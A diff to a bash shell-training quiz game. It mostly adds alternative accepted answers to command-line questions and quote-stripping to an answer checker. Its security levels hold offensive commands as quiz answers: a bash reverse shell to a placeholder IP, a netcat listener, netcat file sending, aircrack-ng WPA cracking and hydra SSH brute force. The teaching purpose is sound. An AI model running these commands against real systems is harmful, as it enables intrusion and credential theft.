@@ -1254,14 +1254,14 @@ gen_level1() {
   # cd variations
   questions+=("$(_phrase "Change to" "Go to" "Enter") ${W}${dir}${C} directory|cd ${dir}")
   questions+=("$(_phrase "Change to" "Go to") ${W}${dir2}${C}|cd ${dir2}")
-  questions+=("Go to home directory|cd|cd ~")
+  questions+=("Go to home directory|cd|cd ~|cd \$HOME")
   questions+=("Go up one directory|cd ..")
   questions+=("Go up two directories|cd ../..")
   questions+=("Go to filesystem root (/)|cd /")
 
   # mkdir
   questions+=("Create directory ${W}${newdir}${C}|mkdir ${newdir}")
-  questions+=("Create nested directories ${W}${dir}/${newdir}${C} (parents too)|mkdir -p ${dir}/${newdir}")
+  questions+=("Create nested directories ${W}${dir}/${newdir}${C} (parents too)|mkdir -p ${dir}/${newdir}|mkdir --parents ${dir}/${newdir}")
 
   printf '%s\n' "${questions[@]}"
 }
@@ -1284,7 +1284,7 @@ gen_level2() {
   questions+=("Append a timestamp to ${W}${log}${C}|date >> ${log}")
   questions+=("Save whoami output to ${W}${outfile}${C}, overwriting it|whoami > ${outfile}")
   questions+=("Append hostname to ${W}${log}${C}|hostname >> ${log}")
-  questions+=("Create empty file ${W}${outfile2}${C}|touch ${outfile2}|#state:exists:${outfile2}")
+  questions+=("Create empty file ${W}${outfile2}${C}|touch ${outfile2}|> ${outfile2}|#state:exists:${outfile2}")
 
   # tee - write to file AND stdout
   questions+=("Echo '${word}' to screen AND save to ${W}${txt}${C}§echo ${word} | tee ${txt}§#output:${word}")
@@ -1618,8 +1618,8 @@ gen_level10() {
   questions+=("Print 'failed' to stderr if command fails§ls /nonexistent 2>/dev/null ; [[ \$? -ne 0 ]] && echo failed >&2§ls /nonexistent 2>/dev/null ; [ \$? -ne 0 ] && echo failed >&2")
 
   # === COMPOUND: Environment variables with commands ===
-  questions+=("List files in home directory using \$HOME|ls \$HOME")
-  questions+=("Create file in home using \$HOME|touch \$HOME/test.txt")
+  questions+=("List files in home directory using \$HOME|ls \$HOME|ls ~|ls ~/")
+  questions+=("Create file in home using \$HOME|touch \$HOME/test.txt|touch ~/test.txt")
   questions+=("Search in user's home for ${Y}${term}${C}§grep -r ${term} \$HOME 2>/dev/null | head -5")
 
   printf '%s\n' "${questions[@]}"
@@ -1768,8 +1768,8 @@ gen_level13() {
   # Archives (tar) - only use .tar.gz since answers use gzip flags
   local -a GZ_ARCHIVES=(backup.tar.gz archive.tar.gz files.tgz release.tar.gz package.tar.gz source.tar.gz logs.tar.gz)
   _fpick GZ_ARCHIVES; local gz_archive=$REPLY
-  questions+=("Extract ${gz_archive}|tar xzf ${gz_archive}|tar -xzf ${gz_archive}")
-  questions+=("Extract ${gz_archive} to ${dir}/|tar xzf ${gz_archive} -C ${dir}/|tar -xzf ${gz_archive} -C ${dir}/")
+  questions+=("Extract ${gz_archive}|tar xzf ${gz_archive}|tar -xzf ${gz_archive}|tar xf ${gz_archive}|tar -xf ${gz_archive}")
+  questions+=("Extract ${gz_archive} to ${dir}/|tar xzf ${gz_archive} -C ${dir}/|tar -xzf ${gz_archive} -C ${dir}/|tar xf ${gz_archive} -C ${dir}/|tar -xf ${gz_archive} -C ${dir}/")
   questions+=("Create archive.tar.gz from ${dir}/|tar czf archive.tar.gz ${dir}/|tar -czf archive.tar.gz ${dir}/")
   questions+=("List contents of ${gz_archive} without extracting|tar tzf ${gz_archive}|tar -tzf ${gz_archive}|tar tf ${gz_archive}")
 
@@ -1779,10 +1779,10 @@ gen_level13() {
   questions+=("$(_phrase "Show" "Display" "Print") where symlink points|readlink link|ls -l link")
   questions+=("Remove symlink (not target)|rm link|unlink link")
   questions+=("Create hard link 'hardlink' pointing to ${txt}|ln ${txt} hardlink")
-  questions+=("Follow symlink to find real path|readlink -f link")
+  questions+=("Follow symlink to find real path|readlink -f link|realpath link")
 
   # Permissions - dynamic octal modes
-  questions+=("Make ${script} executable|chmod +x ${script}")
+  questions+=("Make ${script} executable|chmod +x ${script}|chmod a+x ${script}")
   questions+=("Set ${script} to rwxr-xr-x (755)|chmod 755 ${script}")
   questions+=("Set ${cfg} to rw-r--r-- (644)|chmod 644 ${cfg}")
   questions+=("Set ${txt} permissions to ${perm1}|chmod ${perm1} ${txt}")
@@ -1841,7 +1841,7 @@ gen_level14() {
   questions+=("Enable ${svc} at boot|systemctl enable ${svc}")
   questions+=("Disable ${svc} at boot|systemctl disable ${svc}")
   questions+=("List running services|systemctl list-units --type=service --state=running")
-  questions+=("Show services that failed to start|systemctl --failed")
+  questions+=("Show services that failed to start|systemctl --failed|systemctl list-units --state=failed")
   questions+=("Reload systemd daemon|systemctl daemon-reload")
   questions+=("Show ${svc} logs|journalctl -u ${svc}")
   questions+=("Follow ${svc} logs|journalctl -fu ${svc}")
@@ -1860,16 +1860,16 @@ gen_level14() {
   questions+=("Change owner of ${txt} to ${user}|chown ${user} ${txt}")
   questions+=("Change owner and group of ${txt} to ${user}|chown ${user}:${user} ${txt}")
   questions+=("Change owner of ${dir}/ recursively to ${user}|chown -R ${user}:${user} ${dir}/")
-  questions+=("Show current user|whoami")
+  questions+=("Show current user|whoami|id -un")
   questions+=("Show user id info|id")
 
   # Package management (distro-agnostic patterns)
-  questions+=("Install ${pkg} (Debian/Ubuntu)|apt install ${pkg}|sudo apt install ${pkg}")
-  questions+=("Install ${pkg} (Fedora/RHEL)|dnf install ${pkg}|sudo dnf install ${pkg}")
-  questions+=("Upgrade all packages (Debian/Ubuntu)|apt upgrade|sudo apt upgrade")
-  questions+=("Upgrade all packages (Fedora/RHEL)|dnf upgrade|sudo dnf upgrade")
+  questions+=("Install ${pkg} (Debian/Ubuntu)|apt install ${pkg}|sudo apt install ${pkg}|apt-get install ${pkg}|sudo apt-get install ${pkg}")
+  questions+=("Install ${pkg} (Fedora/RHEL)|dnf install ${pkg}|sudo dnf install ${pkg}|yum install ${pkg}|sudo yum install ${pkg}")
+  questions+=("Upgrade all packages (Debian/Ubuntu)|apt upgrade|sudo apt upgrade|apt-get upgrade|sudo apt-get upgrade")
+  questions+=("Upgrade all packages (Fedora/RHEL)|dnf upgrade|sudo dnf upgrade|yum upgrade|sudo yum upgrade")
   questions+=("Search for package ${term} (Debian)|apt search ${term}|apt-cache search ${term}")
-  questions+=("Search for package ${term} (Fedora)|dnf search ${term}")
+  questions+=("Search for package ${term} (Fedora)|dnf search ${term}|yum search ${term}")
 
   # Security audit
   questions+=("Run full system security audit|lynis audit system")
@@ -1882,10 +1882,10 @@ gen_level15() {
   eval "local questions=() $_QV"; _ctx
 
   # Session management (CLI)
-  questions+=("Start new tmux session|tmux|tmux new")
+  questions+=("Start new tmux session|tmux|tmux new|tmux new-session")
   questions+=("Start tmux session named 'work'|tmux new -s work|tmux new-session -s work")
   questions+=("List sessions|tmux ls|tmux list-sessions")
-  questions+=("Attach to last session|tmux attach|tmux a")
+  questions+=("Attach to last session|tmux attach|tmux a|tmux at")
   questions+=("Attach to session 'work'|tmux attach -t work|tmux a -t work")
   questions+=("Kill session 'work'|tmux kill-session -t work")
   questions+=("Kill tmux server (all sessions)|tmux kill-server")
@@ -2274,7 +2274,7 @@ gen_level21() {
   # find -exec - with flag alternatives
   questions+=("Run ls -l on each .${ext} file found|find . -name '*.${ext}' -exec ls -l {} \\;|fd -e ${ext} -x ls -l {}")
   questions+=("Count lines in each .${ext} file|find . -name '*.${ext}' -exec wc -l {} \\;|fd -e ${ext} -x wc -l {}")
-  questions+=("Delete all .${ext2} files|find . -name '*.${ext2}' -delete|fd -e ${ext2} -x rm {}")
+  questions+=("Delete all .${ext2} files|find . -name '*.${ext2}' -delete|find . -name '*.${ext2}' -exec rm {} \\;|fd -e ${ext2} -x rm {}")
   questions+=("Make all .sh files executable|find . -name '*.sh' -exec chmod +x {} \\;|fd -e sh -x chmod +x {}")
   questions+=("Search '${term}' in each .${ext} file|find . -name '*.${ext}' -exec grep ${term} {} \\;|fd -e ${ext} -x rg ${term} {}")
   questions+=("Show size of files larger than ${size}|find . -size +${size} -exec du -h {} \\;|fd -S +${size} -x du -h {}")
@@ -2459,7 +2459,7 @@ gen_level23() {
 
   # Staging & committing
   questions+=("Stage file '${txt}' for commit|git add ${txt}")
-  questions+=("Stage all tracked changed files|git add -u")
+  questions+=("Stage all tracked changed files|git add -u|git add --update")
   questions+=("Stage all files including untracked|git add -A|git add --all")
   questions+=("Stage interactively (hunks)|git add -p|git add --patch")
   questions+=("Commit with message|git commit -m \"message\"")
@@ -2677,7 +2677,7 @@ gen_level26() {
   questions+=("Crack WPA handshake using ${W}${wordlist}${C}|aircrack-ng -w ${wordlist} capture-01.cap")
 
   # Netcat
-  questions+=("Start reverse shell listener on port ${port}|nc -lvnp ${port}")
+  questions+=("Start reverse shell listener on port ${port}|nc -lvnp ${port}|ncat -lvnp ${port}")
   questions+=("Connect to remote port|nc ${ip} ${port}")
   questions+=("Send file via netcat|nc ${ip} ${port} < file.txt")
   questions+=("Port scan with netcat|nc -zv ${ip} 1-1000")
@@ -2749,16 +2749,16 @@ gen_level27() {
   questions+=("Brute force with ${W}${wordlist}${C}, limit to 4 parallel tasks|hydra -t 4 -l ${user} -P ${wordlist} ${ip} ssh")
 
   # Encoding/decoding
-  questions+=("Encode string 'secret' to base64§echo -n 'secret' | base64")
+  questions+=("Encode string 'secret' to base64§echo -n 'secret' | base64§printf 'secret' | base64")
   questions+=("Decode base64 file encoded.txt|base64 -d encoded.txt")
-  questions+=("Generate MD5 hash of string 'password'§echo -n 'password' | md5sum")
-  questions+=("Generate SHA256 hash of string 'password'§echo -n 'password' | sha256sum")
+  questions+=("Generate MD5 hash of string 'password'§echo -n 'password' | md5sum§printf 'password' | md5sum")
+  questions+=("Generate SHA256 hash of string 'password'§echo -n 'password' | sha256sum§printf 'password' | sha256sum")
   questions+=("Generate SHA256 hash of file ${hash}|sha256sum ${hash}")
 
   # Hex operations
-  questions+=("Convert 'hello' to hex§echo -n 'hello' | xxd -p")
+  questions+=("Convert 'hello' to hex§echo -n 'hello' | xxd -p§printf 'hello' | xxd -p")
   questions+=("Convert hex back to ascii§echo '68656c6c6f' | xxd -r -p")
-  questions+=("Hex dump ${W}${bin}${C} with addresses|xxd ${bin}")
+  questions+=("Hex dump ${W}${bin}${C} with addresses|xxd ${bin}|hexdump -C ${bin}")
   questions+=("Hex dump ${W}${bin}${C} (no addresses)|xxd -p ${bin}")
 
   printf '%s\n' "${questions[@]}"
@@ -2839,7 +2839,7 @@ gen_level29() {
 
   # System enumeration
   questions+=("Show OS and kernel version|uname -a")
-  questions+=("Show running processes|ps aux")
+  questions+=("Show running processes|ps aux|ps -ef")
   questions+=("Show network connections|ss -tlpn|netstat -tlpn")
   questions+=("Show cron jobs|cat /etc/crontab; crontab -l")
   questions+=("Show mounted filesystems|mount|df -h")
@@ -2912,7 +2912,7 @@ gen_level30() {
   questions+=("List all open ports and processes§ss -tlpn | awk 'NR>1 {print \$4, \$6}'")
 
   # === NETWORK SURVIVAL ===
-  questions+=("Simple HTTP server (Python)|python3 -m http.server ${port}")
+  questions+=("Simple HTTP server (Python)|python3 -m http.server ${port}|python -m http.server ${port}")
   questions+=("Reverse shell (bash)|bash -i >& /dev/tcp/${ip}/${port} 0>&1")
   questions+=("Create SSH tunnel and background|ssh -fNT -L ${port}:localhost:${port} ${user}@${host}")
   questions+=("Test if host is up (no ping)|timeout 1 bash -c \"echo >/dev/tcp/${ip}/22\" && echo up")
@@ -3252,6 +3252,18 @@ _fnorm() {
     else _pp+=("$p"); fi
   done
   parts=("${_pp[@]}")
+  # Strip quotes for normalization (handles 'x' vs "x" vs x, -F',' vs -F,)
+  local _qi _qv
+  for _qi in "${!parts[@]}"; do
+    _qv="${parts[$_qi]}"
+    if [[ ${#_qv} -ge 2 && "${_qv:0:1}" == "'" && "${_qv: -1}" == "'" ]]; then
+      parts[$_qi]="${_qv:1:${#_qv}-2}"
+    elif [[ ${#_qv} -ge 2 && "${_qv:0:1}" == '"' && "${_qv: -1}" == '"' ]]; then
+      parts[$_qi]="${_qv:1:${#_qv}-2}"
+    elif [[ "$_qv" == -* ]]; then
+      parts[$_qi]="${_qv//\'/}"; parts[$_qi]="${parts[$_qi]//\"/}"
+    fi
+  done
   REPLY="${parts[0]}"
   for p in "${parts[@]:1}"; do
     if [[ "$p" == -* ]]; then
